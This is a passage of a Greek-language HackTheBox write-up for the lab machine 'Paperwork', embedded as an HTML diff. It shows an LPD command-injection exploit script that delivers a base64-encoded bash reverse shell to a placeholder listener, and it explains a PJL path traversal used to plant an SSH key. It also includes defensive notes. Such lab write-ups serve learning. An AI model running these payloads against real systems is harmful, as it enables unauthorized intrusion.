@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Paperwork — S. Markakis</title>
+<meta name="description" content="OS command injection σε μια χειροφτιαγμένη υπηρεσία intake LPD/RFC 1179, ένα διακοσμητικό path sanitiser σε έναν emulator εκτυπωτή JetDirect/PJL, και ένας daemon root που διαρρέει ένα ανοιχτό file descriptor σε ένα αρχείο credential μόνο-root μέσω SCM_RIGHTS.">
+<meta property="og:title" content="HTB: Paperwork — S. Markakis">
+<meta property="og:description" content="OS command injection σε μια χειροφτιαγμένη υπηρεσία intake LPD/RFC 1179, ένα διακοσμητικό path sanitiser σε έναν emulator εκτυπωτή JetDirect/PJL, και ένας daemon root που διαρρέει ένα ανοιχτό file descriptor σε ένα αρχείο credential μόνο-root μέσω SCM_RIGHTS.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-paperwork-el.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-paperwork.png">
+<meta property="og:locale" content="el_GR">
+<meta property="og:locale:alternate" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-paperwork.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-paperwork-el.html">
+<link rel="alternate" hreflang="en" href="https://s-markakis.github.io/writeups/htb-paperwork.html">
+<link rel="alternate" hreflang="el" href="https://s-markakis.github.io/writeups/htb-paperwork-el.html">
+<link rel="alternate" hreflang="x-default" href="https://s-markakis.github.io/writeups/htb-paperwork.html">
+
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    /* terminal colors — muted to stay on-brand */
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* ── NAV ── */
+
+  /* ── WRAPPER ── */
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  /* ── POST HEADER ── */
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-git  { background: #d8c8b8; color: #5a3a18; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  /* ── OVERVIEW BOX ── */
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  /* ── ATTACK CHAIN ── */
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  /* ── HEADINGS ── */
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p {
+    color: var(--text);
+    margin-bottom: 1rem;
+  }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  /* ── INLINE CODE ── */
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  /* ── TERMINAL BLOCK ── */
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  /* prompt colors — muted to match cream palette */
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  /* ── ALERT BOXES ── */
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  /* ── TABLE ── */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  /* ── LISTS ── */
+  ul { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  /* ── SUMMARY TABLE special cols ── */
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  /* ── FOOTER ── */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  /* ── BACK LINK ── */
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  /* SCREENSHOTS */
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Paperwork",
+  "description": "OS command injection σε μια χειροφτιαγμένη υπηρεσία intake LPD/RFC 1179, ένα διακοσμητικό path sanitiser σε έναν emulator εκτυπωτή JetDirect/PJL, και ένας daemon root που διαρρέει ένα ανοιχτό file descriptor σε ένα αρχείο credential μόνο-root μέσω SCM_RIGHTS.",
+  "datePublished": "2026-09-03",
+  "dateModified": "2026-09-03",
+  "inLanguage": "el",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-paperwork-el.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-paperwork.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-paperwork"
+  },
+  "timeRequired": "PT9M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Πίσω στο blog</a>
+
+<div class="wrapper">
+
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Πίσω στα posts</a>
+  <p style="font-size:.8rem;letter-spacing:.04em;color:var(--text-mid);margin-bottom:1.2rem;"><a href="htb-paperwork.html" style="font-weight:600;">English</a> &nbsp;·&nbsp; <strong style="color:var(--text-dark);">Ελληνικά</strong></p>
+
+  <!-- POST HEADER -->
+  <div class="post-header">
+    <h1>HTB: Paperwork</h1>
+    <div class="post-meta">
+      <span class="date">3 Σεπτεμβρίου 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag">Linux</span>
+      <span class="tag">Ευκολο</span>
+      <span>&nbsp;9 λεπτά αναγνωσης</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <!-- OVERVIEW -->
+  <div class="overview">
+    Το Paperwork ντύνει μια αλυσίδα μικρών, αυτόνομων υπηρεσιών Python σαν εταιρικό pipeline "αρχειοθέτησης εγγράφων". Το foothold είναι ένα <strong>OS command injection</strong> σε μια χειροφτιαγμένη <strong>υπηρεσία intake LPD (RFC&nbsp;1179)</strong> που εξυπηρετικά κουβαλά τη δική της πηγή. Αυτό προσγειώνεται σαν <code>lp</code>, που μπορεί να φτάσει μια δεύτερη υπηρεσία — έναν <strong>emulator εκτυπωτή JetDirect / PJL</strong> του οποίου το path sanitiser είναι διακοσμητικό, δίνοντας ένα αυθαίρετο file write μέσα στο home του <code>archivist</code> και πρόσβαση SSH. Το root είναι το ενδιαφέρον κομμάτι: ένας daemon που ανήκει στον root <strong>περνά στον client ένα ανοιχτό file descriptor</strong> σε ένα αρχείο credential μόνο-root μέσω ενός UNIX socket με <code>SCM_RIGHTS</code>, οπότε ο <code>archivist</code> διαβάζει ένα password που ποτέ δεν είχε άδεια να ανοίξει.
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-paperwork/img-pwned.webp" type="image/webp"><img class="screenshot" src="assets/htb-paperwork/img-pwned.png" alt="Hack The Box — Congratulations SP1R4! You are player #6057 to have solved Paperwork." width="1568" height="247" loading="lazy" decoding="async"></picture>
+
+  <div class="chain">
+    <span class="chain-node">LPD intake :1515</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">shell=True job name</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">lp</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">PJL :9100 path traversal</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">authorized_keys write</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">archivist (SSH)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">SCM_RIGHTS fd leak</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root</span>
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-paperwork/img-attack-chain.webp" type="image/webp"><img class="screenshot" src="assets/htb-paperwork/img-attack-chain.png" alt="Paperwork attack chain: nmap to lp via LPD command injection, lp to archivist via PJL path traversal, archivist to root via SCM_RIGHTS file-descriptor leak" width="2480" height="676" loading="lazy" decoding="async"></picture>
+
+  <!-- ══ RECON ══ -->
+  <h2>Αναγνώριση</h2>
+
+  <h3>Nmap</h3>
+  <p>Τρεις θύρες, και η τρίτη είναι ολόκληρο το box:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">nmap -p- --min-rate 2000 -sC -sV &lt;TARGET_IP&gt; -oA paperwork</span>
+
+<span class="po">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    nginx 1.28.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://paperwork.htb/
+1515/tcp open  ifor-protocol?
+| fingerprint-strings:
+|   TerminalServerCookie:
+|_    Archive_Printer is ready and printing.</span></div>
+  </div>
+
+  <p>Το TTL 63 στο ping έλεγε ήδη Linux. Το OpenSSH 10 είναι ολοκαίνουριο — κανένα δωρεάν foothold εκεί, οπότε είναι η <em>έξοδος</em>, όχι η είσοδος. Η θύρα 80 απαντά στη γυμνή IP με ένα redirect στο <code>paperwork.htb</code>, που σημαίνει ότι το nginx κάνει routing με βάση την κεφαλίδα <code>Host:</code> — πρόσθεσε το vhost και παίρνουμε μια πραγματική σελίδα:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">/etc/hosts</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">echo "&lt;TARGET_IP&gt;  paperwork.htb" | sudo tee -a /etc/hosts</span></div>
+  </div>
+
+  <h3>Η πύλη intake</h3>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-paperwork/img-intake-portal.webp" type="image/webp"><img class="screenshot" src="assets/htb-paperwork/img-intake-portal.png" alt="paperwork.htb intake portal — a corporate document archiving page listing RFC 1179 compliance, an archive_intake queue, and a paperwork-archive-v1.02 processor" width="1367" height="896" loading="lazy" decoding="async"></picture>
+
+  <p>Κάθε γραμμή σε αυτή τη σελίδα είναι μια ένδειξη:</p>
+  <ul>
+    <li><strong>"Backend spooler <code>PRN-ARCHIVE-01</code>"</strong> — ένας print spooler.</li>
+    <li><strong>"Compliance Level: RFC 1179"</strong> — το RFC&nbsp;1179 <em>είναι</em> το πρωτόκολλο Line Printer Daemon, κανονικά TCP&nbsp;515. Το scan μας βρήκε μια υπηρεσία σαν-εκτυπωτή στη <strong>1515</strong>.</li>
+    <li><strong>"Remote job submission … Submissions without a valid identifier will fail"</strong> — υπάρχει input validation σε κάποιο identifier job.</li>
+    <li>Ο <strong>Internal Processor</strong> κάνει link στο <code>/download/archive</code>.</li>
+  </ul>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">/download/archive</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">curl -s http://paperwork.htb/download/archive -o archive.zip &amp;&amp; unzip -o archive.zip</span>
+<span class="po">Archive:  archive.zip
+  inflating: server.py</span></div>
+  </div>
+
+  <p>Όχι ένας compiled "processor" — η ίδια η πηγή της υπηρεσίας. Αυτό μετατρέπει την εκμετάλλευση σε άσκηση ανάγνωσης.</p>
+
+  <!-- ══ FOOTHOLD ══ -->
+  <h2>Foothold — Command Injection στην Υπηρεσία Intake LPD</h2>
+
+  <p>Το <code>server.py</code> είναι ένας ελάχιστος, μη-στάνταρ listener LPD στη θύρα 1515. Το σχετικό path είναι ο handler "receive print job":</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">server.py — handle_print_job()</span>
+    </div>
+    <div class="term-body"><span class="po">def handle_print_job(self, data):
+    queue = data[1:].decode().strip()
+    if queue not in VALID_QUEUE:                 </span><span class="pco"># substring check vs $LPD_QUEUE</span><span class="po">
+        self.sock.send(b'\x01'); return
+    self.sock.send(b'\x00')
+
+    while True:
+        chunk = self.sock.recv(1024)
+        subcommand = chunk[0]
+        self.sock.send(b'\x00')
+        if subcommand == 2:                      </span><span class="pco"># control file</span><span class="po">
+            size = int(chunk[1:].decode().split()[0])
+            content = b""
+            while len(content) &lt; size:
+                content += self.sock.recv(size - len(content) + 1)
+            job_name = "Unknown"
+            for line in content.decode(errors='ignore').split('\n'):
+                if line.strip().startswith('J'):
+                    job_name = line.strip()[1:]; break
+            </span><span class="pr">subprocess.Popen(f"echo 'Archive: {job_name}' &gt;&gt; /tmp/archive.log", shell=True)</span><span class="po"></span></div>
+  </div>
+
+  <p>Το <code>job_name</code> έρχεται κατευθείαν από το καλώδιο — είναι η γραμμή <code>J</code> του control file του job — και παρεμβάλλεται σε ένα string shell με <code>shell=True</code>. Όρισε το όνομα job σε <code>';id;'</code> και το shell τρέχει:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">the resulting command line</span>
+    </div>
+    <div class="term-body"><span class="po">echo 'Archive: '; id ; '' &gt;&gt; /tmp/archive.log</span></div>
+  </div>
+
+  <p>Το πρωτόκολλο γύρω του είναι κομμένο από το πραγματικό RFC&nbsp;1179: στείλε byte <code>0x02</code> + το όνομα queue (η σελίδα μας λέει ότι είναι <code>archive_intake</code>, και ο έλεγχος είναι ένα ελαστικό substring test), διάβασε το ack <code>0x00</code>, μετά στείλε ένα chunk <code>0x02</code> + <code>"&lt;size&gt; &lt;name&gt;"</code>, μετά ακριβώς <code>&lt;size&gt;</code> bytes κειμένου control-file που περιέχει μία γραμμή <code>J&lt;payload&gt;</code>. Ένας σύντομος client το κάνει:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">exploit.py</span>
+    </div>
+    <div class="term-body"><span class="po">import socket, time, base64
+
+TARGET = ("&lt;TARGET_IP&gt;", 1515)
+rev = "bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1"
+b64 = base64.b64encode(rev.encode()).decode()
+payload = f"';echo {b64}|base64 -d|bash;'"          </span><span class="pco"># break out of the quoted echo</span><span class="po">
+ctrl = f"J{payload}\n".encode()
+
+s = socket.create_connection(TARGET, timeout=10)
+s.sendall(b"\x02archive_intake\n");           time.sleep(.3)
+s.sendall(b"\x02" + f"{len(ctrl)} cfA001pw".encode() + b"\n"); time.sleep(.3)
+s.recv(16)
+s.sendall(ctrl)                                     </span><span class="pco"># J-line fires subprocess.Popen()</span><span class="po"></span></div>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nc -lvnp 4444</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">python3 exploit.py &amp;&amp; nc -lvnp 4444</span>
+
+<span class="po">connect to [&lt;LHOST&gt;] from &lt;TARGET_IP&gt;
+</span><span class="pu">lp</span><span class="ps">@</span><span class="ph">paperwork</span><span class="ps">:</span><span class="pp">/opt/LPDServer</span><span class="ps">$ </span><span class="pc">id</span><span class="po">
+uid=7(lp) gid=7(lp) groups=7(lp)</span></div>
+  </div>
+
+  <div class="alert alert-warn">Το να παρεμβάλλεις οποιαδήποτε τιμή ελεγχόμενη από το δίκτυο σε ένα f-string που δίνεται στο <code>subprocess</code> με <code>shell=True</code> είναι όλο το bug. Το <code>Popen([...], shell=False)</code> με μια λίστα ορισμάτων — ή απλά το <code>shlex.quote</code> — το σκοτώνει.</div>
+
+  <!-- ══ LP -> ARCHIVIST ══ -->
+  <h2>lp&nbsp;→&nbsp;archivist — Path Traversal στον Emulator JetDirect</h2>
+
+  <p>Ο <code>lp</code> είναι ένας service account χωρίς sudo (το binary δεν είναι καν εγκατεστημένο). Η καταμέτρηση διαδικασιών και sockets δείχνει τι άλλο είναι τοπικό:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ps aux / ss -tlnp</span>
+    </div>
+    <div class="term-body"><span class="pu">lp</span><span class="ps">@</span><span class="ph">paperwork</span><span class="ps">:</span><span class="pp">/opt/LPDServer</span><span class="ps">$ </span><span class="pc">ps aux | grep -E 'python|printer' ; ss -tlnp</span>
+
+<span class="po">root    /usr/bin/python3 /root/staging/CorpoSite/app.py          </span><span class="pco"># the site, as root</span><span class="po">
+archiv+ /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ ...
+lp      /usr/bin/python3 /opt/LPDServer/server.py
+root    /usr/bin/python3 /usr/bin/paperwork-daemon
+
+LISTEN 127.0.0.1:1337      </span><span class="pco"># Flask dev instance of the site (dead end)</span><span class="po">
+LISTEN 0.0.0.0:1515        </span><span class="pco"># our LPD</span><span class="po">
+LISTEN 127.0.0.1:9100      </span><span class="pco"># jetdirect.py, run by archivist</span><span class="po"></span></div>
+  </div>
+
+  <p>Ο <code>archivist</code> τρέχει έναν emulator raw-print / <strong>PJL</strong> στη 9100, φυλακισμένο στο <code>/home/archivist/printer/</code>. Οι emulators PJL υλοποιούν <code>FSUPLOAD</code> (ανάγνωση) και <code>FSDOWNLOAD</code> (εγγραφή). Το <code>FSUPLOAD</code> παραδίδει τη δική του πηγή του emulator:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">jetdirect.py — Filesystem._translate()</span>
+    </div>
+    <div class="term-body"><span class="po">class Filesystem:
+    def __init__(self, root_dir):
+        self._root = os.path.abspath(root_dir)
+
+    def _translate(self, path):
+        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
+        </span><span class="pr">return os.path.normpath(os.path.join(self._root, clean))</span><span class="po">
+
+    def read(self, path):
+        target = self._translate(path)
+        if os.path.isfile(target):
+            with open(target, "rb") as f: return f.read()
+
+    def write(self, path, data):
+        target = self._translate(path)
+        os.makedirs(os.path.dirname(target), exist_ok=True)   </span><span class="pco"># will create ~/.ssh for us</span><span class="po">
+        with open(target, "wb") as f: f.write(data)</span></div>
+  </div>
+
+  <p>Το "sanitiser" αφαιρεί το prefix volume <code>0:</code> και κόβει αρχικά slashes — και δεν κάνει τίποτα για το <code>../</code>. Το <code>normpath(join("/home/archivist/printer", "../.ssh/authorized_keys"))</code> συμπτύσσεται σε <code>/home/archivist/.ssh/authorized_keys</code>. (Ένα προηγούμενο <code>FSQUERY</code> του <code>/etc/passwd</code> επέστρεψε <code>FILEERROR=1</code> — όχι ένα block, απλά το <code>os.listdir()</code> πέταξε error σε μη-φάκελο. Read και write δεν έχουν τέτοιο φρουρό.) Οπότε φυτεύουμε ένα κλειδί SSH:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">FSDOWNLOAD → authorized_keys</span>
+    </div>
